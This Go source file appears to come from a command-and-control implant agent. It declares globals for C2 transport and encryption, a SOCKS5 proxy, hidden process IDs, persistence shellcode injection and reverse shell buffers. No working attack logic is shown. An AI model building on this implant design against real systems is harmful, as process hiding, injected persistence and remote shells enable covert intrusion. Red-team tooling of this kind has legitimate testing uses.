package def

import (
	"net"
	"net/http"
	"os"
	"strconv"
	"sync"

	"github.com/posener/h2conn"
	"github.com/txthinking/socks5"
)

var (
	// Magic String, this is decided at build time
	// use: C2 message construction and encryption
	MagicString = "64781530-1475-4cf8-950c-dcdf4c619dbc"

	// TransportString is the keyword used in handshake
	TransportString = "hello"

	// Transport what transport is this agent using? (HTTP2 / CDN / TOR)
	Transport = "HTTP2"

	// HTTPClient handles agent's http communication
	HTTPClient *http.Client

	// CCMsgConn the connection to CC, for JSON message-based communication
	CCMsgConn *h2conn.Conn

	// KCPKeep: when disconnected from C2, KCP client should be notified
	KCPKeep = true

	// ProxyServer Socks5 proxy listening on agent
	ProxyServer *socks5.Server

	// ProxyListener Socks5 proxy listener
	ProxyListener net.Listener

	// ProxyLock protects ProxyServer and ProxyListener
	ProxyLock sync.Mutex

	// ProxyDone channel to signal proxy server exit
	ProxyDone chan struct{}

	// HIDE_PIDS all the processes
	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}

	// GuardianShellcode inject into a process to gain persistence
	GuardianShellcode = ""

	// will be updated by ReadJSONConfig

	// CCAddress is the address of the CC server
	// in form https://host:port
	CCAddress = ""

	// DefaultShell is the default shell to use, will use custom bash if vaccine is installed
	DefaultShell = ""

	// AESPassword generated from Tag -> md5sum, type: []byte
	AESPassword []byte
)

// Build
var (
	// Version hardcoded version string
	Version = "unknown"
)

const (
	// RShellBufSize buffer size of reverse shell stream
	RShellBufSize = 128

	// ProxyBufSize buffer size of port fwd
	ProxyBufSize = 1024

	// Unknown
	Unknown = "Unknown"
)
